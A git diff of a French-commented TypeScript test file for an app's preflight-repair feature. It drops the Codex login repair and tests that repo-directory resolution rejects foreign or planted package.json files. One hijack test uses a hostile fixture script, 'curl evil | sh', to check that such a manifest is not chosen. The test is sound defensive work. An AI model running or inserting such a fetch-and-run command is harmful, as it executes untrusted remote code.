@@ -6,7 +6,7 @@ import {
   CLAUDE_CLI_INSTALL_COMMAND,
   planPreflightRepair,
   repairPreflightCheck,
-  resolveCodexLoginCwd
+  resolveRepoScriptCwd
 } from './preflight-repair'
 import { PREFLIGHT_REPAIRS } from '../renderer/src/components/preflight-repair-affordance'
 import { sourceProcessPrincipal } from './source-process-principal.test-helpers'
@@ -14,8 +14,8 @@ import { sourceProcessPrincipal } from './source-process-principal.test-helpers'
 /**
  * RÉPARER depuis la popup de diagnostic.
  *
- * Constaté en réel (2026-07-29) : la popup disait « ✗ Session OAuth Codex — npm run codex:login » et
- * rien de plus. L'utilisateur devait sortir de l'app pour agir, alors que l'app sait déjà lancer ce
+ * Constaté en réel (2026-07-29) : la popup affichait un prérequis rouge et sa commande à recopier,
+ * rien de plus. L'utilisateur devait sortir de l'app pour agir, alors que l'app sait déjà lancer le
  * login (bouton « Se reconnecter » de la page Routeur).
  */
 /**
@@ -26,11 +26,17 @@ import { sourceProcessPrincipal } from './source-process-principal.test-helpers'
 const PURGE_HERITAGE = 'Remove-Item Env:CLAUDE_CONFIG_DIR -ErrorAction SilentlyContinue; '
 
 describe('planPreflightRepair — on ne propose QUE ce qu’on sait réparer', () => {
-  it('session Codex → login OAuth dans une console', () => {
-    const plan = planPreflightRepair('codex-session')
+  it('session Claude → login dans une console', () => {
+    const plan = planPreflightRepair('claude-session')
     expect(plan?.kind).toBe('login')
     // La note doit dire que l'app ne voit aucun credential : c'est le point sensible du geste.
     expect(plan?.note).toContain('Autowin')
+  })
+
+  it('MOTEURS RETIRÉS : aucune connexion proposée pour Codex, Kimi ou Gemini', () => {
+    expect(planPreflightRepair('codex-session')).toBeUndefined()
+    expect(planPreflightRepair('kimi-session')).toBeUndefined()
+    expect(planPreflightRepair('gemini-session')).toBeUndefined()
   })
 
   it('brain injoignable → démarrage local', () => {
@@ -53,17 +59,15 @@ describe('planPreflightRepair — on ne propose QUE ce qu’on sait réparer', (
 })
 
 describe('repairPreflightCheck — ce qui est LANCÉ, jamais « réparé »', () => {
-  it('login : ouvre la console dans le repo RÉSOLU (sinon `npm run` ne trouve pas le script)', async () => {
+  it('MOTEUR RETIRÉ : « codex-session » n’ouvre AUCUNE console (plus de connexion Codex)', async () => {
     const openLoginTerminal = vi.fn()
     const outcome = await repairPreflightCheck('codex-session', {
       openLoginTerminal,
       resolveLoginCwd: () => '/repo/autowin'
     })
-    expect(openLoginTerminal).toHaveBeenCalledWith('npm run codex:login', { cwd: '/repo/autowin' })
-    expect(outcome.started).toBe(true)
-    // Le login est INTERACTIF : le compte-rendu renvoie l'utilisateur au re-diagnostic.
-    expect(outcome.detail).toContain('re-vérifie')
-    expect(outcome.detail).not.toMatch(/réparé|résolu/i)
+    expect(openLoginTerminal).not.toHaveBeenCalled()
+    expect(outcome.started).toBe(false)
+    expect(outcome.detail).toContain('Aucune réparation')
   })
 
   /**
@@ -211,17 +215,17 @@ describe('repairPreflightCheck — ce qui est LANCÉ, jamais « réparé »', ()
 
   it('repo INTROUVABLE → on n’ouvre PAS une console qui dira « Missing script »', async () => {
     const openLoginTerminal = vi.fn()
-    const outcome = await repairPreflightCheck('codex-session', {
+    const outcome = await repairPreflightCheck('brain-venv', {
       openLoginTerminal,
       resolveLoginCwd: () => undefined
     })
     expect(openLoginTerminal).not.toHaveBeenCalled()
     expect(outcome.started).toBe(false)
-    expect(outcome.detail).toContain('codex:login')
+    expect(outcome.detail).toContain('bootstrap-deps.ps1')
   })
 
   it('un spawn qui jette ne casse PAS la popup — l’échec est un résultat affichable', async () => {
-    const outcome = await repairPreflightCheck('codex-session', {
+    const outcome = await repairPreflightCheck('brain-venv', {
       resolveLoginCwd: () => '/repo/autowin',
       openLoginTerminal: () => {
         throw new Error('cmd.exe introuvable')
@@ -233,34 +237,34 @@ describe('repairPreflightCheck — ce qui est LANCÉ, jamais « réparé »', ()
 })
 
 /**
- * Le cwd du login : `npm run codex:login` n'existe que dans le package.json du REPO. L'app EMPAQUETÉE
+ * Le cwd du bootstrap : `bootstrap:deps` n'existe que dans le package.json du REPO. L'app EMPAQUETÉE
  * démarre depuis n'importe où (raccourci bureau) — supposer `process.cwd()` produit « Missing script »,
  * c'est-à-dire un bouton qui ouvre une console pour rien. Chemins POSIX dans ces tests : `dirname`
  * remonte les deux séparateurs, et l'échappement Windows brouillerait la lecture.
  */
-describe('resolveCodexLoginCwd — on cherche le repo, on ne le suppose pas', () => {
+describe('resolveRepoScriptCwd — on cherche le repo, on ne le suppose pas', () => {
   const repo = join('/repo', 'autowin')
   const pkg = (dir: string): string => join(dir, 'package.json')
   // Un manifeste ne compte que s'il a l'IDENTITÉ du dépôt : `name` + le script. Le nom seul ne
   // suffit pas, le script seul non plus (cf. les tests de détournement ci-dessous).
   const manifest = (scripts: Record<string, string>, name = AUTOWIN_PACKAGE_NAME): string =>
     JSON.stringify({ name, scripts })
-  const declaring = manifest({ 'codex:login': 'tsx scripts/codex-login.mjs' })
+  const declaring = manifest({ 'bootstrap:deps': 'powershell -File scripts/bootstrap-deps.ps1' })
 
   it('trouve le dossier qui DECLARE le script', () => {
-    expect(resolveCodexLoginCwd([repo], (p) => p === pkg(repo), () => declaring)).toBe(repo)
+    expect(resolveRepoScriptCwd([repo], (p) => p === pkg(repo), () => declaring)).toBe(repo)
   })
 
   it('remonte les parents depuis un sous-chemin (ex. chemin de l’exe empaquete)', () => {
     const exe = join(repo, 'dist', 'win-unpacked', 'autowin-os.exe')
-    expect(resolveCodexLoginCwd([exe], (p) => p === pkg(repo), () => declaring)).toBe(repo)
+    expect(resolveRepoScriptCwd([exe], (p) => p === pkg(repo), () => declaring)).toBe(repo)
   })
 
   it('un package.json SANS le script ne compte pas (le vrai piege)', () => {
     // dist/win-unpacked/resources/app porte un package.json d’app, sans les scripts du repo.
     const packaged = join(repo, 'dist', 'win-unpacked', 'resources', 'app')
     expect(
-      resolveCodexLoginCwd(
+      resolveRepoScriptCwd(
         [packaged],
         (p) => p === pkg(packaged) || p === pkg(repo),
         (p) => (p === pkg(repo) ? declaring : manifest({ start: 'x' }))
@@ -271,7 +275,7 @@ describe('resolveCodexLoginCwd — on cherche le repo, on ne le suppose pas', ()
   it('un manifeste ILLISIBLE n’interrompt pas la remontee', () => {
     const sub = join(repo, 'sub')
     expect(
-      resolveCodexLoginCwd(
+      resolveRepoScriptCwd(
         [sub],
         (p) => p === pkg(sub) || p === pkg(repo),
         (p) => (p === pkg(repo) ? declaring : '{{{ pas du JSON')
@@ -282,7 +286,7 @@ describe('resolveCodexLoginCwd — on cherche le repo, on ne le suppose pas', ()
   it('le PREMIER candidat qui declare gagne (ordre respecte)', () => {
     const other = join('/autre', 'repo')
     expect(
-      resolveCodexLoginCwd(
+      resolveRepoScriptCwd(
         [other, repo],
         (p) => p === pkg(other) || p === pkg(repo),
         () => declaring
@@ -291,32 +295,32 @@ describe('resolveCodexLoginCwd — on cherche le repo, on ne le suppose pas', ()
   })
 
   it('aucun candidat valable → undefined (et l’appelant le DIT)', () => {
-    expect(resolveCodexLoginCwd(['/ailleurs'], () => false, () => '')).toBeUndefined()
-    expect(resolveCodexLoginCwd([], () => true, () => declaring)).toBeUndefined()
+    expect(resolveRepoScriptCwd(['/ailleurs'], () => false, () => '')).toBeUndefined()
+    expect(resolveRepoScriptCwd([], () => true, () => declaring)).toBeUndefined()
   })
 
   it('candidat vide ignore (variable d’environnement non definie)', () => {
-    expect(resolveCodexLoginCwd([''], () => true, () => declaring)).toBeUndefined()
+    expect(resolveRepoScriptCwd([''], () => true, () => declaring)).toBeUndefined()
   })
 
   /**
-   * DÉTOURNEMENT — le dossier élu est ensuite exécuté (`npm run codex:login`, via
+   * DÉTOURNEMENT — le dossier élu est ensuite exécuté (le script du repo, via
    * `powershell -ExecutionPolicy Bypass`). « Ce dossier déclare le script » n'est donc PAS une preuve
    * d'identité : la remontée des parents finit par atteindre `C:\`, dont la racine autorise par défaut
    * la création de fichiers aux utilisateurs authentifiés.
    */
   it('un package.json ÉTRANGER déclarant le script dans un parent n’est PAS élu', () => {
     const parent = '/repo'
-    const hostile = manifest({ 'codex:login': 'curl evil | sh' }, 'pas-autowin')
+    const hostile = manifest({ 'bootstrap:deps': 'curl evil | sh' }, 'pas-autowin')
     expect(
-      resolveCodexLoginCwd([join(parent, 'ailleurs')], (p) => p === pkg(parent), () => hostile)
+      resolveRepoScriptCwd([join(parent, 'ailleurs')], (p) => p === pkg(parent), () => hostile)
     ).toBeUndefined()
   })
 
   it('un C:\\package.json planté à la RACINE n’est jamais inspecté', () => {
     const seen: string[] = []
     expect(
-      resolveCodexLoginCwd(
+      resolveRepoScriptCwd(
         ['C:\\Program Files\\Autowin OS'],
         (p) => {
           seen.push(p)
@@ -329,13 +333,13 @@ describe('resolveCodexLoginCwd — on cherche le repo, on ne le suppose pas', ()
   })
 
   it('un candidat RELATIF est refusé (il se résoudrait depuis le cwd du process)', () => {
-    expect(resolveCodexLoginCwd(['.'], () => true, () => declaring)).toBeUndefined()
-    expect(resolveCodexLoginCwd(['sous-dossier'], () => true, () => declaring)).toBeUndefined()
+    expect(resolveRepoScriptCwd(['.'], () => true, () => declaring)).toBeUndefined()
+    expect(resolveRepoScriptCwd(['sous-dossier'], () => true, () => declaring)).toBeUndefined()
   })
 
   it('SUR CE POSTE : le repo réel est bien élu depuis le cwd', () => {
     // Garde anti-regression : si l'identite exigee ne matche plus, le bouton « Se connecter » meurt.
-    expect(resolveCodexLoginCwd([process.cwd()])).toBe(process.cwd())
+    expect(resolveRepoScriptCwd([process.cwd()])).toBe(process.cwd())
   })
 })
 
@@ -347,7 +351,7 @@ describe('resolveCodexLoginCwd — on cherche le repo, on ne le suppose pas', ()
 describe('contrat — les deux listes de réparables sont identiques', () => {
   it('même ensemble d’ids, mêmes libellés, mêmes notes', () => {
     const rendererIds = Object.keys(PREFLIGHT_REPAIRS).sort()
-    expect(rendererIds).toEqual(['brain', 'brain-venv', 'claude-session', 'codex-session'])
+    expect(rendererIds).toEqual(['brain', 'brain-venv', 'claude-session'])
     for (const id of rendererIds) {
       const plan = planPreflightRepair(id)
       expect(plan, `le renderer propose « ${id} » que le main refuse`).toBeDefined()
